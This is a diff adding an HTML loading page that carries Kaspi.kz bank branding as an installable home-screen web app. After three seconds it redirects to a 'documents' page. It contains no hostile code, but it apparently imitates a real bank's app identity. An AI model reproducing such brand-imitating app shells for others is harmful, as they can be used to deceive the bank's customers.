@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Loading Step 2</title>
+  <link rel="stylesheet" href="./style.css">
+  <meta name="apple-mobile-web-app-title" content="Kaspi.kz">
+  <meta name="application-name" content="Kaspi.kz">
+
+  <link rel="apple-touch-icon" href="./image/kaspi_icon.png">
+  <link rel="manifest" href="./manifest.json">
+
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="default">
+</head>
+
+<body class="no-scroll">
+  <!-- ⚡️ ДОБАВЛЕНО: экран с изображением загрузки -->
+  <div class="load-page-img">
+    <img class="load-image" src="./image/loadpage.png" alt="">
+  </div>
+
+  <!-- ⚡️ ДОБАВЛЕНО: переход через 3 секунды на documents.html -->
+  <script>
+    setTimeout(() => {
+      window.location.href = "documents.html";
+    }, 3000);
+  </script>
+</body>
+
+</html>
